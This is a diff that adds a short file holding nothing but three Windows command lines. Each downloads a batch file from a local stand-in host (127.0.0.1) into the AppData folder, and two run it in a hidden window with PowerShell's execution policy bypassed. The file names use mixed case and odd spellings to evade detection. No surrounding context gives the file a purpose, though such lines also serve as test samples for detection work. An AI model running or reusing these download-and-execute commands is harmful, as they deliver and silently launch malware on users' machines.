@@ -1,0 +1,6 @@
+cmd.exe /c powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass (new-object system.net.webclient).downloadfile('http://127.0.0.1/!n$Ta73r.bAt','%apPdAtA%\!n$Ta73r.bAt'); staRt-prOceSS -windowstyle hidden '%appDatA%\!n$Ta73r.bAt' > 1.txt
+
+wget "http://127.0.0.1/download/installer.bAt" -outfile "appDatA\!nzTa73r.bAt"
+
+	
+powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/download/installer.bAt',"$env:APPDATA\!nzTa73r.bAt");Start-Process ("$env:APPDATA\!nzTa73r.bAt")
